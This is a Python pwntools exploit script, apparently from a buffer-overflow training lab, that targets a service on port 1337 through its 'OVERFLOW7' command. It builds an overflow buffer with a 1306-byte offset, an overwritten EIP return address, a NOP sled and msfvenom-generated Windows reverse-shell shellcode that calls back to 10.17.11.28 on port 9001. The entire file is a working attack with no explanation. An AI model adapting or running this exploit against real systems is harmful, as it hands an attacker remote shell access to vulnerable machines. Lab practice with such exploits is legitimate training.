#!/usr/bin/env python3

from pwn import *

host = "10.10.207.155"
port = 1337

s = remote(host, port)
total_length = 1500
offset = 1306
new_eip = p32(0x62501203)
nop = b"\x90" * 5

buf =  b""
buf += b"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += b"\x76\x0e\xce\x45\x88\x53\x83\xee\xfc\xe2\xf4\x32\xad"
buf += b"\x0a\x53\xce\x45\xe8\xda\x2b\x74\x48\x37\x45\x15\xb8"
buf += b"\xd8\x9c\x49\x03\x01\xda\xce\xfa\x7b\xc1\xf2\xc2\x75"
buf += b"\xff\xba\x24\x6f\xaf\x39\x8a\x7f\xee\x84\x47\x5e\xcf"
buf += b"\x82\x6a\xa1\x9c\x12\x03\x01\xde\xce\xc2\x6f\x45\x09"
buf += b"\x99\x2b\x2d\x0d\x89\x82\x9f\xce\xd1\x73\xcf\x96\x03"
buf += b"\x1a\xd6\xa6\xb2\x1a\x45\x71\x03\x52\x18\x74\x77\xff"
buf += b"\x0f\x8a\x85\x52\x09\x7d\x68\x26\x38\x46\xf5\xab\xf5"
buf += b"\x38\xac\x26\x2a\x1d\x03\x0b\xea\x44\x5b\x35\x45\x49"
buf += b"\xc3\xd8\x96\x59\x89\x80\x45\x41\x03\x52\x1e\xcc\xcc"
buf += b"\x77\xea\x1e\xd3\x32\x97\x1f\xd9\xac\x2e\x1a\xd7\x09"
buf += b"\x45\x57\x63\xde\x93\x2d\xbb\x61\xce\x45\xe0\x24\xbd"
buf += b"\x77\xd7\x07\xa6\x09\xff\x75\xc9\xba\x5d\xeb\x5e\x44"
buf += b"\x88\x53\xe7\x81\xdc\x03\xa6\x6c\x08\x38\xce\xba\x5d"
buf += b"\x03\x9e\x15\xd8\x13\x9e\x05\xd8\x3b\x24\x4a\x57\xb3"
buf += b"\x31\x90\x1f\x39\xcb\x2d\x82\x42\xc5\x59\xe0\x51\xce"
buf += b"\x66\xa1\xda\x28\x2f\x98\x05\x99\x2d\x11\xf6\xba\x24"
buf += b"\x77\x86\x4b\x85\xfc\x5f\x31\x0b\x80\x26\x22\x2d\x78"
buf += b"\xe6\x6c\x13\x77\x86\xa6\x26\xe5\x37\xce\xcc\x6b\x04"
buf += b"\x99\x12\xb9\xa5\xa4\x57\xd1\x05\x2c\xb8\xee\x94\x8a"
buf += b"\x61\xb4\x52\xcf\xc8\xcc\x77\xde\x83\x88\x17\x9a\x15"
buf += b"\xde\x05\x98\x03\xde\x1d\x98\x13\xdb\x05\xa6\x3c\x44"
buf += b"\x6c\x48\xba\x5d\xda\x2e\x0b\xde\x15\x31\x75\xe0\x5b"
buf += b"\x49\x58\xe8\xac\x1b\xfe\x78\xe6\x6c\x13\xe0\xf5\x5b"
buf += b"\xf8\x15\xac\x1b\x79\x8e\x2f\xc4\xc5\x73\xb3\xbb\x40"
buf += b"\x33\x14\xdd\x37\xe7\x39\xce\x16\x77\x86"

shellcode = buf		# msfvenom -p windows/shell_reverse_tcp LHOST=10.17.11.28 LPORT=9001 -b "\x00\x8c\xae\xbe\xfb" -f py


payload = [
    b"OVERFLOW7 ",
    b"A" * offset,
    new_eip,
    nop,
    shellcode,
    b"C" * (total_length - offset - len(new_eip) - len(nop) - len(shellcode)),

]

payload = b"".join(payload)
s.send(payload)
s.close()